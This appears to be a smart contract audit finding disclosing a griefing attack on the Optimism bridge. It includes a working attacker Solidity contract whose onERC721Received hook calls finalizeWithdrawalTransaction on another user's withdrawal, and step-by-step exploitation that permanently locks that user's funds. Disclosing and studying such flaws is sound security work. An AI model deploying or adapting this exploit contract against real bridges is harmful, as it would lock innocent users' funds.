# Bad actors can call the `finalizeWithdrawalTransaction()` function in the NFT fallback function to lock user's funds

## Summary
Bad actors can call the `finalizeWithdrawalTransaction()` function in the NFT fallback function to lock user's funds.

## Vulnerability Detail
Let me show how a bad actor lock user's funds.

1.Bob calls the `bridgeERC721To()` function to bridge an NFT from L2 to L1.
Bob's contract for receiving NFT on L1 is implemented as follows.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

struct WithdrawalTransaction {
   uint256 nonce;
   address sender;
   address target;
   uint256 value;
   uint256 gasLimit;
   bytes data;
}

interface IOptimismPortal {
   function finalizeWithdrawalTransaction(WithdrawalTransaction memory _tx) external;     
}

contract BobContract {
   bytes metaData;
   address optimismPortalAddress;
   bool opt;

    constructor(address _optimismPortal) {
       optimismPortalAddress = _optimismPortal;
    }

    function setOpt(bool v,WithdrawalTransaction memory _tx) external{
        opt = v;
        metaData = abi.encodeWithSelector(
           IOptimismPortal.finalizeWithdrawalTransaction.selector,
           _tx
       );
   }
    function onERC721Received(address, address, uint256, bytes memory) public pure  returns (bytes4) {
        if (opt)
        {
             optimismPortalAddress.call(metaData);
        }else
        {
           revert("ERROR");
        }

        return this.onERC721Received.selector;
    }

}

```
2. After challenge period and validation passed, the protocol tries to transfer NFT to Bob on L1  during relaying the message. Then  the function `onERC721Received()` is triggered, since the `opt` is false, the transaction will fail. And the protocol will set `failedMessages[versionedHash] = true`.
3. After a while, Bob noticed that Alice was withdrawing a large amount of funds from L2 to L1. Due to a challenge period, she is waitting for finishing to finalize it.
4. Bob calls his contract `setOpt()` to set the opt to true and Alice withdraw tx. Once the challenge period has passed, Bob calls the `relayMessage()` function to get his NFT.
```solidity
    function setOpt(bool v,WithdrawalTransaction memory _tx) external{
        opt = v;
        metaData = abi.encodeWithSelector(
           IOptimismPortal.finalizeWithdrawalTransaction.selector,
           _tx
       );
   }

```
5.When the `onERC721Received()` is triggered,Bob's contract will call ` optimismPortalAddress.call()` to finalize Alice's transaction. The transaction will fail at ` if (reentrancyLocks[versionedHash]) {`
```solidity
  // Check if the reentrancy lock for the `versionedHash` is already set.
        if (reentrancyLocks[versionedHash]) {
            revert("ReentrancyGuard: reentrant call");
        }
        // Trigger the reentrancy lock for `versionedHash`
        reentrancyLocks[versionedHash] = true;

```
6.Since the `relayMessage()` function does not handle the error msg, transaction will be finished successfully. However, thevaluefinalizedWithdrawals[withdrawalHash] = true` value set to true in the `finalizeWithdrawalTransaction()` function. And Alice will not able to relay the message again. Her funds will be locked in the contract.
```solidity
   xDomainMsgSender = _sender;
        bool success = SafeCall.callWithMinGas(_target, _minGasLimit, _value, _message);
        xDomainMsgSender = Constants.DEFAULT_L2_SENDER;


```


## Impact
User's funds can be locked in the contract.
